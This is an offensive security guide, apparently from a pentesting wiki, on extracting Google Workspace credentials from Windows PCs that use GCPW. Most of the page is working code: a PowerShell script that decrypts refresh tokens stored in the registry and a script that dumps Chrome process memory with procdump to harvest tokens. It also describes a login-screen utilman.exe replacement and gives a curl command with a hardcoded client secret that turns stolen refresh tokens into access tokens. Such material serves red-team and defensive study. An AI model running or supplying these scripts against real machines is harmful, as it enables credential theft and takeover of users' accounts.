# GCPW - Reconnaissance and Token Extraction

## Basic Information

This is the single sign-on that Google Workspaces provides so users can login in their Windows PCs using **their Workspace credentials**. Moreover, this will store tokens to access Google Workspace in some places in the PC.

> [!TIP]
> Note that [**Winpeas**](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS/winPEASexe) is capable to detect **GCPW**, get information about the configuration and **even tokens**.

### GCPW - MitM

When a user access a Windows PC synchronized with Google Workspace via GCPW it will need to complete a common login form. This login form will return an OAuth code that the PC will exchange for the refresh token in a request like:

```http
POST /oauth2/v4/token HTTP/2
Host: www.googleapis.com
Content-Length: 311
Content-Type: application/x-www-form-urlencoded
[...headers...]

scope=https://www.google.com/accounts/OAuthLogin
&grant_type=authorization_code
&client_id=77185425430.apps.googleusercontent.com
&client_secret=OTJgUOQcT7lO7GsGZq2G4IlT
&code=4/0AVG7fiQ1NKncRzNrrGjY5S02wBWBJxV9kUNSKvB1EnJDCWyDmfZvelqKp0zx8jRGmR7LUw
&device_id=d5c82f70-71ff-48e8-94db-312e64c7354f
&device_type=chrome
```

New lines have been added to make it more readable.

> [!NOTE]
> It was possible to perform a MitM by installing `Proxifier` in the PC, overwriting the `utilman.exe` binary with a `cmd.exe` and executing the **accessibility features** in the Windows login page, which will execute a **CMD** from which you can **launch and configure the Proxifier**.\
> Don't forget to **block QUICK UDP** traffic in `Proxifier` so it downgrades to TCP communication and you can see it.
>
> Also configure in "Serviced and other users" both options and install the Burp CA cert in the Windows.

Moreover adding the keys `enable_verbose_logging = 1` and `log_file_path = C:\Public\gcpw.log` in **`HKLM:\SOFTWARE\Google\GCPW`** it's possible to make it store some logs.

### GCPW - Fingerprint

It's possible to check if GCPW is installed in a device checking if the following process exist or if the following registry keys exist:

```bash
# Check process gcpw_extension.exe
if (Get-Process -Name "gcpw_extension" -ErrorAction SilentlyContinue) {
    Write-Output "The process gcpw_xtension.exe is running."
} else {
    Write-Output "The process gcpw_xtension.exe is not running."
}

# Check if HKLM\SOFTWARE\Google\GCPW\Users exists
$gcpwHKLMPath = "HKLM:\SOFTWARE\Google\GCPW\Users"
if (Test-Path $gcpwHKLMPath) {
    Write-Output "GCPW is installed: The key $gcpwHKLMPath exists."
} else {
    Write-Output "GCPW is not installed: The key $gcpwHKLMPath does not exist."
}

# Check if HKCU\SOFTWARE\Google\Accounts exists
$gcpwHKCUPath = "HKCU:\SOFTWARE\Google\Accounts"
if (Test-Path $gcpwHKCUPath) {
    Write-Output "Google Accounts are present: The key $gcpwHKCUPath exists."
} else {
    Write-Output "No Google Accounts found: The key $gcpwHKCUPath does not exist."
}
```

In **`HKCU:\SOFTWARE\Google\Accounts`** it's possible to access the email of the user and the encrypted **refresh token** if the user recently logged in.

In **`HKLM:\SOFTWARE\Google\GCPW\Users`** it's possible to find the **domains** that are allowed to login in the key `domains_allowed` and in subkeys it's possible to find information about the user like email, pic, user name, token lifetimes, token handle...

> [!NOTE]
> The token handle is a token that starts with `eth.` and from which can be extracted some info with a request like:
>
> ```bash
> curl -s 'https://www.googleapis.com/oauth2/v2/tokeninfo' \
>   -d 'token_handle=eth.ALh9Bwhhy_aDaRGhv4v81xRNXdt8BDrWYrM2DBv-aZwPdt7U54gp-m_3lEXsweSyUAuN3J-9KqzbDgHBfFzYqVink340uYtWAwxsXZgqFKrRGzmXZcJNVapkUpLVsYZ_F87B5P_iUzTG-sffD4_kkd0SEwZ0hSSgKVuLT-2eCY67qVKxfGvnfmg'
> # Example response
> {
>   "audience": "77185425430.apps.googleusercontent.com",
>   "scope": "https://www.google.com/accounts/OAuthLogin",
>   "expires_in": 12880152
> }
> ```
>
> Also it's possible to find the token handle of an access token with a request like:
>
> ```bash
> curl -s 'https://www.googleapis.com/oauth2/v2/tokeninfo' \
>   -d 'access_token=<access token>'
> # Example response
> {
>   "issued_to": "77185425430.apps.googleusercontent.com",
>   "audience": "77185425430.apps.googleusercontent.com",
>   "scope": "https://www.google.com/accounts/OAuthLogin",
>   "expires_in": 1327,
>   "access_type": "offline",
>   "token_handle": "eth.ALh9Bwhhy_aDaRGhv4v81xRNXdt8BDrWYrM2DBv-aZwPdt7U54gp-m_3lEXsweSyUAuN3J-9KqzbDgHBfFzYqVink340uYtWAwxsXZgqFKrRGzmXZcJNVapkUpLVsYZ_F87B5P_iUzTG-sffD4_kkd0SEwZ0hSSgKVuLT-2eCY67qVKxfGvnfmg"
> }
> ```
>
> Afaik it's not possible obtain a refresh token or access token from the token handle.

Moreover, the file **`C:\ProgramData\Google\Credential Provider\Policies\<sid>\PolicyFetchResponse`** is a json containing the information of different **settings** like `enableDmEnrollment`, `enableGcpAutoUpdate`, `enableMultiUserLogin` (if several users from Workspace can login in the computer) and `validityPeriodDays` (number of days a user doesn't need to reauthenticate with Google directly).

## GCPW - Get Tokens

### GCPW - Registry Refresh Tokens

Inside the registry **`HKCU:\SOFTWARE\Google\Accounts`** it might be possible to find some accounts with the **`refresh_token`** encrypted inside. The method **`ProtectedData.Unprotect`** can easily decrypt it.

<details>

<summary>Get <strong><code>HKCU:\SOFTWARE\Google\Accounts</code></strong> data and decrypt refresh_tokens</summary>

```bash
# Import required namespace for decryption
Add-Type -AssemblyName System.Security

# Base registry path
$baseKey = "HKCU:\SOFTWARE\Google\Accounts"

# Function to search and decrypt refresh_token values
function Get-RegistryKeysAndDecryptTokens {
    param (
        [string]$keyPath
    )

    # Get all values within the current key
    $registryKey = Get-Item -Path $keyPath
    $foundToken = $false

    # Loop through properties to find refresh_token
    foreach ($property in $registryKey.Property) {
        if ($property -eq "refresh_token") {
            $foundToken = $true
            try {
                # Get the raw bytes of the refresh_token from the registry
                $encryptedTokenBytes = (Get-ItemProperty -Path $keyPath -Name $property).$property

                # Decrypt the bytes using ProtectedData.Unprotect
                $decryptedTokenBytes = [System.Security.Cryptography.ProtectedData]::Unprotect($encryptedTokenBytes, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
                $decryptedToken = [System.Text.Encoding]::UTF8.GetString($decryptedTokenBytes)

                Write-Output "Path: $keyPath"
                Write-Output "Decrypted refresh_token: $decryptedToken"
                Write-Output "-----------------------------"
            }
            catch {
                Write-Output "Path: $keyPath"
                Write-Output "Failed to decrypt refresh_token: $($_.Exception.Message)"
                Write-Output "-----------------------------"
            }
        }
    }

    # Recursively process all subkeys
    Get-ChildItem -Path $keyPath | ForEach-Object {
        Get-RegistryKeysAndDecryptTokens -keyPath $_.PSPath
    }
}

# Start the search from the base key
Get-RegistryKeysAndDecryptTokens -keyPath $baseKey
```

</details>

Example out:

```
Path: Microsoft.PowerShell.Core\Registry::HKEY_CURRENT_USER\SOFTWARE\Google\Accounts\100402336966965820570Decrypted refresh_token: 1//0<EXAMPLE_GOOGLE_REFRESH_TOKEN_REDACTED>
```

As explained in [**this video**](https://www.youtube.com/watch?v=FEQxHRRP_5I), if you don't find the token in the registry it's possible to modify the value (or delete) from **`HKLM:\SOFTWARE\Google\GCPW\Users\<sid>\th`** and the next time the user access the computer he will need to login again and the **token will be stored in the previous registry**.

### GCPW - Disk Refresh Tokens

The file **`%LocalAppData%\Google\Chrome\User Data\Local State`** stores the key to decrypt the **`refresh_tokens`** located inside the **Google Chrome profiles** of the user like:

- `%LocalAppData%\Google\Chrome\User Data\Default\Web Data`
- `%LocalAppData%\Google\Chrome\Profile*\Default\Web Data`

It's possible to find some **C# code** accessing these tokens in their decrypted manner in [**Winpeas**](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS/winPEASexe).

Moreover, the encrypting can be found in this code: [https://github.com/chromium/chromium/blob/7b5e817cb016f946a29378d2d39576a4ca546605/components/os_crypt/sync/os_crypt_win.cc#L216](https://github.com/chromium/chromium/blob/7b5e817cb016f946a29378d2d39576a4ca546605/components/os_crypt/sync/os_crypt_win.cc#L216)

It can be observed that AESGCM is used, the encrypted token starts with a **version** (**`v10`** at this time), then it [**has 12B of nonce**](https://github.com/chromium/chromium/blob/7b5e817cb016f946a29378d2d39576a4ca546605/components/os_crypt/sync/os_crypt_win.cc#L42), and then it has the **cypher-text** with a final **mac of 16B**.

### GCPW - Dumping tokens from processes memory

The following script can be used to **dump** every **Chrome** process using `procdump`, extract the **strings** and then **search** for strings related to **access and refresh tokens**. If Chrome is connected to some Google site, some **process will be storing refresh and/or access tokens in memory!**

<details>

<summary>Dump Chrome processes and search tokens</summary>

```bash
# Define paths for Procdump and Strings utilities
$procdumpPath = "C:\Users\carlos_hacktricks\Desktop\SysinternalsSuite\procdump.exe"
$stringsPath = "C:\Users\carlos_hacktricks\Desktop\SysinternalsSuite\strings.exe"
$dumpFolder = "C:\Users\Public\dumps"

# Regular expressions for tokens
$tokenRegexes = @(
    "ya29\.[a-zA-Z0-9_\.\-]{50,}",
    "1//[a-zA-Z0-9_\.\-]{50,}"
)

# Create a directory for the dumps if it doesn't exist
if (!(Test-Path $dumpFolder)) {
    New-Item -Path $dumpFolder -ItemType Directory
}

# Get all Chrome process IDs
$chromeProcesses = Get-Process -Name "chrome" -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Id

# Dump each Chrome process
foreach ($processId in $chromeProcesses) {
    Write-Output "Dumping process with PID: $processId"
    & $procdumpPath -accepteula -ma $processId "$dumpFolder\chrome_$processId.dmp"
}

# Extract strings and search for tokens in each dump
Get-ChildItem $dumpFolder -Filter "*.dmp" | ForEach-Object {
    $dumpFile = $_.FullName
    $baseName = $_.BaseName
    $asciiStringsFile = "$dumpFolder\${baseName}_ascii_strings.txt"
    $unicodeStringsFile = "$dumpFolder\${baseName}_unicode_strings.txt"

    Write-Output "Extracting strings from $dumpFile"
    & $stringsPath -accepteula -n 50 -nobanner $dumpFile > $asciiStringsFile
    & $stringsPath -accepteula -n 50 -nobanner -u $dumpFile > $unicodeStringsFile

    $outputFiles = @($asciiStringsFile, $unicodeStringsFile)

    foreach ($file in $outputFiles) {
        foreach ($regex in $tokenRegexes) {

            $matches = Select-String -Path $file -Pattern $regex -AllMatches

            $uniqueMatches = @{}

            foreach ($matchInfo in $matches) {
                foreach ($match in $matchInfo.Matches) {
                    $matchValue = $match.Value
                    if (-not $uniqueMatches.ContainsKey($matchValue)) {
                        $uniqueMatches[$matchValue] = @{
                            LineNumber = $matchInfo.LineNumber
                            LineText   = $matchInfo.Line.Trim()
                            FilePath   = $matchInfo.Path
                        }
                    }
                }
            }

            foreach ($matchValue in $uniqueMatches.Keys) {
                $info = $uniqueMatches[$matchValue]
                Write-Output "Match found in file '$($info.FilePath)' on line $($info.LineNumber): $($info.LineText)"
            }
        }

        Write-Output ""
    }
}

Remove-Item -Path $dumpFolder -Recurse -Force
```

</details>

I tried the same with `gcpw_extension.exe` but it didn't find any token.

For some reason, s**ome extracted access tokens won't be valid (although some will be)**. I tried the following script to remove chars 1 by 1 to try to get the valid token from the dump. It never helped me to find a valid one, but it might I guess:

<details>

<summary>Check access token by removing chars 1 by 1</summary>

```bash
#!/bin/bash

# Define the initial access token
access_token="ya29.<EXAMPLE_ACCESS_TOKEN_REDACTED>"

# Define the URL for the request
url="https://www.googleapis.com/oauth2/v1/tokeninfo"

# Loop until the token is 20 characters or the response doesn't contain "error_description"
while [ ${#access_token} -gt 20 ]; do
    # Make the request and capture the response
    response=$(curl -s -H "Content-Type: application/x-www-form-urlencoded" -d "access_token=$access_token" $url)

    # Check if the response contains "error_description"
    if [[ ! "$response" =~ "error_description" ]]; then
        echo "Success: Token is valid"
        echo "Final token: $access_token"
        echo "Response: $response"
        exit 0
    fi

    # Remove the last character from the token
    access_token=${access_token:0:-1}

    echo "Token length: ${#access_token}"
done

echo "Error: Token invalid or too short"
```

</details>

### GCPW - Generating access tokens from refresh tokens

Using the refresh token it's possible to generate access tokens using it and the client ID and client secret specified in the following command:

```bash
curl -s --data "client_id=77185425430.apps.googleusercontent.com" \
     --data "client_secret=OTJgUOQcT7lO7GsGZq2G4IlT" \
     --data "grant_type=refresh_token" \
     --data "refresh_token=1//0<EXAMPLE_GOOGLE_REFRESH_TOKEN_REDACTED>" \
     https://www.googleapis.com/oauth2/v4/token
```
